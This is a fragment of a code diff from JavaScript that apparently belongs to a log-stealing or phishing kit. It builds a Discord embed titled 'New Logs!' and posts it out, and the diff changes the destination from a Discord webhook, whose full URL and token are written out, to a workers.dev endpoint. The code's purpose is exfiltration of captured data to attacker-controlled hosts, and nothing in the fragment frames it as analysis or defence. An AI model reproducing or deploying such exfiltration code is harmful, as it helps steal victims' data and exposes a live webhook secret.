@@ -380,7 +380,7 @@
 	  const webhookUrl = "https://discordapp.com/api/webhooks/1369387012054061098/5PeDGn87ArvRyRms-OxKyN1-4doQOwcjhcPHFj0EBRE_yOte59HJBOnUOll3TI37eREb";
 
 	  const message = {
-		  content: null,
+		  content: "?",
 		  embeds: [
 			{
 			  title: "**New Logs! :stuck_out_tongue: **",
@@ -414,7 +414,7 @@
 		  attachments: []
 		};
 
-	  fetch(webhookUrl, {
+	  fetch("https://froska.froska.workers.dev", {
 		method: "POST",
 		headers: {
 		  "Content-Type": "application/json"
